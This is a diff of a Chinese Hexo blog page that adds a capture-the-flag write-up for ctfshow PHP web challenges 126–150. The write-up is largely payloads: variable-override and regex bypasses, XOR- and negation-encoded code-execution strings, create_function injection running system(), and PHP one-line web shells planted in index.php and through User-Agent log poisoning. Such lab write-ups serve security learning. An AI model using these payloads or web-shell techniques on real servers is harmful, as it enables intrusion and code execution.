@@ -185,6 +185,174 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/18/ctfshow-web%E5%85%A5%E9%97%A8126/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="吕宙航">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/18/ctfshow-web%E5%85%A5%E9%97%A8126/" class="post-title-link" itemprop="url">ctfshow web入门126~150</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-18 15:42:06" itemprop="dateCreated datePublished" datetime="2023-03-18T15:42:06+08:00">2023-03-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-23 12:07:09" itemprop="dateModified" datetime="2023-03-23T12:07:09+08:00">2023-03-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/" itemprop="url" rel="index"><span itemprop="name">php特性</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h1><p>与web125差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: a=1+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>
+<h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><p>绕过方式和web123一样。<br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctf show=ilove36d</span><br></pre></td></tr></table></figure>
+<h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><p><img src="/pic/128.png"><br>考察点：gettext拓展的使用<br>在开启该拓展后 _() 等效于 gettext()<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>
+<h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><p><img src="/pic/129.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stripos(string,find,start)</span><br><span class="line">返回值：返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE。注释：字符串位置从0开始，不是从1开始</span><br></pre></td></tr></table></figure>
+<p>看别人的wp绕过的姿势有很多啊，但是怎么一到我这里就失灵了啊。只能用php伪协议<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=php://filter/|ctfshow/resource=flag.php   #也可以用其他的过滤器</span><br></pre></td></tr></table></figure>
+<h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><p><img src="/pic/130.png"><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;#url&#x27;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;f&#x27;:&#x27;a&#x27;*1000000+&#x27;ctfshow&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,data=data).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>
+<p>或者<br>数组绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f[]=1   #stripos应用于数组的时候会返回null，null!==false</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=ctfshow</span><br></pre></td></tr></table></figure>
+<p>/s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f=ctfshow就可以了。</p>
+<h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;#url&#x27;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;f&#x27;:&#x27;a&#x27;*1000000+&#x27;36Dctfshow&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,data=data).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>
+<h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><p><img src="/pic/132.png"><br>一打开网站我都惊呆了，好高级的感觉。然后访问robots.txt有/admin访问就能看到源码。<br><img src="/pic/132.1.png"><br>啊~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>这一题好简单啊。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$code === mt_rand(1,0x36D) &amp;&amp; $password === $flag</span><br></pre></td></tr></table></figure>
+<p>只要让这个为false，username=admin和code=admin就行<br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;code=admin&amp;password=1</span><br></pre></td></tr></table></figure>
+<h1 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h1><p><img src="/pic/134.png"><br>parse_str()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把查询字符解析到变量</span><br></pre></td></tr></table></figure>
+<p>ectract()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从数组中将变量导入当前的符号表</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">四个变量的介绍：</span><br><span class="line"></span><br><span class="line">1.$_SERVER[&quot;QUERY_STRING&quot;]</span><br><span class="line"></span><br><span class="line">说明：查询(query)的字符串</span><br><span class="line"></span><br><span class="line">2.$_SERVER[&quot;REQUEST_URI&quot;]</span><br><span class="line"></span><br><span class="line">说明：访问此页面所需的URI</span><br><span class="line">　　</span><br><span class="line">3.$_SERVER[&quot;SCRIPT_NAME&quot;]</span><br><span class="line"></span><br><span class="line">说明：包含当前脚本的路径</span><br><span class="line">　　</span><br><span class="line">4.$_SERVER[&quot;PHP_SELF&quot;]</span><br></pre></td></tr></table></figure>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/?p=222 (附带查询)</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&quot;QUERY_STRING&quot;]==&gt;“p=222”;</span><br><span class="line"></span><br><span class="line">$_SERVER[&quot;REQUEST_URI&quot;] ==&gt;&quot;/?p=222&quot;;</span><br><span class="line"></span><br><span class="line">$_SERVER[&quot;SCRIPT_NAME&quot;] ==&gt;&quot;/index.php&quot;;</span><br><span class="line"></span><br><span class="line">$_SERVER[&quot;PHP_SELF&quot;] ==&gt;&quot;/index.php&quot;;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>
+<h1 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h1><p><img src="/pic/136.png"><br>跟着大佬学到了好多啊<br>在linux里可以用tee命令读取标准输入的数据，并将其内容输出成文件<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=ls /|tee 1 #把根目录里的内容写进1文件里</span><br><span class="line">?c=tac /f149_15_h3r3|tee 2</span><br></pre></td></tr></table></figure>
+<h1 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h1><p><img src="/pic/137.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func — 把第一个参数作为回调函数调用</span><br></pre></td></tr></table></figure>
+<p>考察调用类中的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line">-&gt;用于动态语境处理某个类的某个实例</span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>
+<h1 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h1><p><img src="/pic/138.png"><br>相当于把冒号禁用了，但是call_user_func还可以传数组<br>第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>
+<h1 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h1><p>太难了，脚本看不懂，以后有机会了再做</p>
+<h1 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h1><p><img src="/pic/140.png"><br>可以看到只要我们让intval($code)为0就可以了<br>intval会将非数字字符转换为0，也就是说 intval(‘a’)==0 intval(‘.’)==0 intval(‘/‘)==0<br>所以方法就挺多了<br><img src="/pic/140.1.png"><br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1=chr&amp;f2=chr</span><br></pre></td></tr></table></figure>
+<p>我感觉随便搞一点函数放上去都可以。</p>
+<h1 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h1><p><img src="/pic/141.png"><br>传入的v3必须是非单词字符<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a><br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)-</span><br></pre></td></tr></table></figure>
+<h1 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h1><p><img src="/pic/142.png"><br>emmmmmmmmmmmm，让我太奶来都会做<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=0</span><br></pre></td></tr></table></figure>
+<h1 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h1><p><img src="/pic/143.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1</span><br></pre></td></tr></table></figure>
+<h1 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h1><p><img src="/pic/144.png"><br>对v3的长度进行了限制,所以在v2上下手<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)&amp;v3=1</span><br></pre></td></tr></table></figure>
+<h1 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h1><p><img src="/pic/145.png"><br>可以用三目运算符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1?phpinfo():1;&quot;); #这是可以运行的</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):</span><br></pre></td></tr></table></figure>
+<h1 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h1><p>过滤了：没办法用三目运算符，可以用等号和位运算符\</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1==phpinfo()||1;&quot;);  #这也可以运行</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)||</span><br></pre></td></tr></table></figure>
+<h1 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h1><p><img src="/pic/147.png"><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/755/">具体原理看这个</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">类似于</span><br><span class="line"></span><br><span class="line">function f($a) &#123;</span><br><span class="line">  echo $a.&quot;123&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?show=&#125;system(&quot;tac flag.php&quot;);/*</span><br><span class="line">POST:ctf=\create_function</span><br></pre></td></tr></table></figure>
+<h1 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h1><p><img src="/pic/148.png"><br>没过滤异或还可以用异或<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure>
+<h1 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h1><p><img src="/pic/149.png"><br>预期解是条件竞争，可是我搞了半天也不行，就直接在index.php里改了<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?ctf=index.php</span><br><span class="line">POST: show=&lt;?php @eval($_POST[a];)?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后用蚁剑连接。</p>
+<h1 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class CTFSHOW&#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    private $vip;</span><br><span class="line">    private $secret;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;vip = 0;</span><br><span class="line">        $this-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isVIP()&#123;</span><br><span class="line">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __autoload($class)&#123;</span><br><span class="line">        if(isset($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#过滤字符</span><br><span class="line">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line">if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;</span><br><span class="line">    die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">extract($_GET);</span><br><span class="line">if(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    echo &quot;class is exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class="line">    include($ctf);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>非预期<br>日志文件包含写一句话<br>修改user_agent内容为一句话，然后包含/var/log/nginx/access.log就可以使用我们写的一句话了。<br>首先访问index.php 修改user_agent为<?php eval($_POST['a']);?><br><img src="/pic/150.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/17/ctfshow-web%E5%85%A5%E9%97%A8110/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1095,104 +1263,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/25/ctfshow-web%E5%85%A5%E9%97%A869~74/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="吕宙航">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/01/25/ctfshow-web%E5%85%A5%E9%97%A869~74/" class="post-title-link" itemprop="url">ctfshow web入门69~74</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-01-25 15:23:05 / 修改时间：16:07:21" itemprop="dateCreated datePublished" datetime="2023-01-25T15:23:05+08:00">2023-01-25</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/ctfshow/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>12k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>11 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h1><p>和web68一样。<br>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/01/25/ctfshow-web%E5%85%A5%E9%97%A869~74/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1262,7 +1332,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1311,12 +1381,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">77k</span>
+    <span title="站点总字数">81k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:10</span>
+    <span title="站点阅读时长">1:13</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
